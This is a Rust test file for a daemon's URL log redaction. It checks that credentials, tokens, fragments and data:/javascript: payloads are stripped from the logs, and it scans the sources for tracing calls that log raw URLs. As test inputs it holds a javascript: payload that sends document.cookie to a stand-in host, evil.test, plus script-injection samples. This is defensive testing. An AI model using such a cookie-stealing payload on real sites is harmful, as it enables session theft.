//! #185: URLs written to the daemon log go through the public-readback
//! redaction, so tokens in query strings, fragments, credentials and
//! `data:`/`javascript:` payloads never reach the log.

use std::fs;
use std::path::{Path, PathBuf};

use super::{RedactedUrl, RedactedUrlOpt};

#[test]
fn must_pass_a_plain_url_keeps_its_scheme_and_host() {
    assert_eq!(
        RedactedUrl("https://example.com/docs/page").to_string(),
        "https://example.com/redacted"
    );
    assert_eq!(
        RedactedUrl("https://example.com/").to_string(),
        "https://example.com/"
    );
}

#[test]
fn must_fail_secrets_in_a_url_never_reach_the_log() {
    let logged = RedactedUrl("https://user:hunter2@example.com/cb?token=SECRET123#access=FRAG456")
        .to_string();
    for secret in ["hunter2", "SECRET123", "FRAG456"] {
        assert!(!logged.contains(secret), "{secret} leaked: {logged}");
    }
    assert_eq!(logged, "https://example.com/redacted?redacted#redacted");
    let payload = RedactedUrl("data:text/html,<script>steal()</script>").to_string();
    assert!(!payload.contains("steal"), "{payload}");
    assert_eq!(payload, "data:redacted");
}

#[test]
fn must_fail_javascript_url_payload_is_redacted() {
    let payload =
        RedactedUrl("javascript:fetch('https://evil.test/?c='+document.cookie)").to_string();
    for leaked in ["fetch", "evil.test", "cookie"] {
        assert!(!payload.contains(leaked), "{leaked} leaked: {payload}");
    }
    assert_eq!(payload, "javascript:redacted");
    let upper = RedactedUrl("JavaScript:steal()").to_string();
    assert_eq!(upper, "javascript:redacted");
    let wrapped = RedactedUrl("view-source:javascript:steal()").to_string();
    assert_eq!(wrapped, "view-source:javascript:redacted");
}

#[test]
fn must_fail_an_absent_url_prints_none_not_a_value() {
    assert_eq!(RedactedUrlOpt(None).to_string(), "<none>");
    assert_eq!(
        RedactedUrlOpt(Some("https://example.com/p?token=SECRET123")).to_string(),
        "https://example.com/redacted?redacted"
    );
}

/// Guard scan (read-only): every tracing macro in production sources that logs
/// a field whose name ends in `url` wraps the value in `RedactedUrl` /
/// `RedactedUrlOpt` (or the public-readback redactor).
#[test]
fn must_fail_no_tracing_call_site_logs_a_raw_url_field() -> anyhow::Result<()> {
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
    let mut files = Vec::new();
    rust_sources(&root, &mut files)?;
    assert!(
        files.len() > 50,
        "source scan found only {} files under {}",
        files.len(),
        root.display()
    );
    let mut offenders = Vec::new();
    for file in files {
        let source = without_line_comments(&fs::read_to_string(&file)?);
        for body in tracing_macro_bodies(&source) {
            for arg in top_level_args(body) {
                if let Some(field) = unredacted_url_field(arg) {
                    offenders.push(format!("{}: {field}", file.display()));
                }
            }
        }
    }
    assert!(
        offenders.is_empty(),
        "tracing call sites logging a raw url field: {offenders:#?}"
    );
    Ok(())
}

#[test]
fn must_fail_the_url_log_guard_flags_a_raw_url_field_and_accepts_a_wrapped_one() {
    let flagged = |source: &str| {
        tracing_macro_bodies(source)
            .into_iter()
            .flat_map(top_level_args)
            .filter_map(unredacted_url_field)
            .count()
    };
    assert_eq!(
        flagged(r#"tracing::info!(target_url = %target.url, "opened")"#),
        1
    );
    assert_eq!(flagged(r#"warn!(code = "X", url = ?page_url, "x")"#), 1);
    assert_eq!(flagged(r#"tracing::info!(%url, "opened")"#), 1);
    assert_eq!(
        flagged(
            r#"tracing::info!(target_url = %crate::server::url_redaction::RedactedUrl(&target.url), "opened")"#
        ),
        0
    );
    assert_eq!(
        flagged(r#"tracing::info!(url = %RedactedUrlOpt(entry.url.as_deref()), n = 1, "x")"#),
        0
    );
    assert_eq!(flagged(r#"tracing::info!(url_len = 3, "x")"#), 0);
}

fn rust_sources(dir: &Path, out: &mut Vec<PathBuf>) -> std::io::Result<()> {
    for entry in fs::read_dir(dir)? {
        let path = entry?.path();
        if path.is_dir() {
            if path.file_name().is_some_and(|name| name == "tests") {
                continue;
            }
            rust_sources(&path, out)?;
        } else if path.extension().is_some_and(|ext| ext == "rs") {
            let stem = path
                .file_stem()
                .and_then(|stem| stem.to_str())
                .unwrap_or_default();
            if !(stem.starts_with("tests") || stem.ends_with("_tests")) {
                out.push(path);
            }
        }
    }
    Ok(())
}

fn without_line_comments(source: &str) -> String {
    source
        .replace("\r\n", "\n")
        .lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .collect::<Vec<_>>()
        .join("\n")
}

const LOG_MACROS: [&str; 5] = ["info!(", "warn!(", "error!(", "debug!(", "trace!("];

fn tracing_macro_bodies(source: &str) -> Vec<&str> {
    let mut bodies = Vec::new();
    for macro_open in LOG_MACROS {
        for (at, _) in source.match_indices(macro_open) {
            let boundary = source[..at]
                .chars()
                .next_back()
                .is_none_or(|ch| !(ch.is_alphanumeric() || ch == '_'));
            if !boundary {
                continue;
            }
            let start = at + macro_open.len();
            if let Some(len) = matching_close(&source[start..]) {
                bodies.push(&source[start..start + len]);
            }
        }
    }
    bodies
}

/// Byte offset of the `)` closing a macro call whose `(` is just before `rest`.
fn matching_close(rest: &str) -> Option<usize> {
    let (mut depth, mut in_string, mut escaped) = (1_u32, false, false);
    for (index, ch) in rest.char_indices() {
        if in_string {
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == '"' {
                in_string = false;
            }
            continue;
        }
        match ch {
            '"' => in_string = true,
            '(' | '[' | '{' => depth += 1,
            ')' | ']' | '}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(index);
                }
            }
            _ => {}
        }
    }
    None
}

fn top_level_args(body: &str) -> Vec<&str> {
    let (mut depth, mut in_string, mut escaped, mut start) = (0_u32, false, false, 0);
    let mut args = Vec::new();
    for (index, ch) in body.char_indices() {
        if in_string {
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == '"' {
                in_string = false;
            }
            continue;
        }
        match ch {
            '"' => in_string = true,
            '(' | '[' | '{' => depth += 1,
            ')' | ']' | '}' => depth = depth.saturating_sub(1),
            ',' if depth == 0 => {
                args.push(&body[start..index]);
                start = index + 1;
            }
            _ => {}
        }
    }
    args.push(&body[start..]);
    args
}

/// `Some(arg)` when `arg` is a `name = value` / `%name` / `name` tracing field
/// whose name ends in `url` and whose value is not wrapped in the redactor.
fn unredacted_url_field(arg: &str) -> Option<String> {
    let arg = arg.trim();
    if arg.starts_with('"') {
        return None;
    }
    // `name = value` may use dotted field names; the shorthand form (`%name`,
    // `name`) is a bare identifier, so a dotted positional argument is not a field.
    let (name, value, dotted_allowed) = match arg.split_once('=') {
        Some((left, right)) if !right.starts_with('=') && !left.ends_with(['!', '<', '>']) => {
            (left.trim(), right, true)
        }
        _ => (arg.trim_start_matches(['%', '?']), arg, false),
    };
    let is_field_name = !name.is_empty()
        && name
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || ch == '_' || (dotted_allowed && ch == '.'));
    let wrapped = value.contains("RedactedUrl") || value.contains("redact_url_for_public_readback");
    (is_field_name && name.to_ascii_lowercase().ends_with("url") && !wrapped)
        .then(|| arg.to_owned())
}
